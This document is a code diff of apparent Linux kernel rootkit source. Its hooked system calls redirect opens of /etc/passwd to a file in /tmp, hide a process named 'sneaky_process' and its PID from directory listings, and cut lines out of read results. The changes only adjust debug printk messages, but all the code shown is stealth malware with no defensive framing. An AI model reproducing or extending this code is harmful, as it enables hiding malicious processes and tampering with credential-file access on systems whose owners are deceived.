@@ -50,7 +50,7 @@ static asmlinkage int sneaky_sys_openat(const struct pt_regs *regs)
   const char * filename = (char *)regs->si;
   if (strcmp(filename, "/etc/passwd") == 0) {
     copy_to_user((void *)filename, "/tmp/passwd", strlen("/tmp/passwd"));
-    printk(KERN_INFO "***hacking openat - filename: %s***\n", filename);
+    printk(KERN_INFO "***hacking openat***\n");
   }    
   return original_openat(regs);
 }
@@ -64,9 +64,9 @@ static asmlinkage ssize_t sneaky_sys_getdents64(const struct pt_regs * regs) {
   while (pos < nread) {
     struct linux_dirent64 * dirent = (struct linux_dirent64 *)((char *)regs->si + pos);
     if ((strcmp(dirent->d_name, "sneaky_process") == 0) || (strcmp(dirent->d_name, sneaky_pid) == 0)) {
-      printk(KERN_INFO "**hacking getdents64***");
       memmove(dirent, (char *)dirent + dirent->d_reclen, nread - (pos +dirent->d_reclen));
       nread -= dirent->d_reclen;
+      printk(KERN_INFO "**hacking getdents64***\n");
     } else {
       pos += dirent->d_reclen;
     }
@@ -87,6 +87,7 @@ static asmlinkage ssize_t sneaky_sys_read(const struct pt_regs * regs) {
       nextLine++;
       memmove(target, nextLine, nread - (ssize_t)(nextLine - buf));
       nread -= (ssize_t)(nextLine - target);
+      printk(KERN_INFO "***hacking read***\n");
     }
   }
   return nread;
